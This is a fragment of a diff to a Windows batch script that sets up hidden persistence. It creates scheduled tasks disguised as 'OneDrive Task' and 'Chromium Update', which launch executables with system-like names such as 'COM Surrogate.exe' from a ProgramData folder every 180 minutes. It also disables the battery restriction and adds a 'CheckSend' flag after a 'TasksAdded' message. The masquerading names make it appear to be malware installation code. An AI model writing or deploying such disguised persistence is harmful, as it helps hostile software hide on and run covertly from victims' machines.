@@ -200,6 +200,10 @@ schtasks /create /tn "OneDrive Task" /tr "\"%ProgramData%\Microsoft\Windows\KMSA
 schtasks /create /tn "Chromium Update" /tr "\"%ProgramData%\Microsoft\Windows\COM Surrogate.exe"" /sc minute /mo 180 /f & powershell -Command "$task = Get-ScheduledTask -TaskName 'Chromium Update'; $task.Settings.DisallowStartIfOnBatteries = $false; $task | Set-ScheduledTask"
 
 set "MESSAGE=TasksAdded|"
+set "CheckSend=1"
+
+
+
 
 :AFTERTASKSEVERY
 
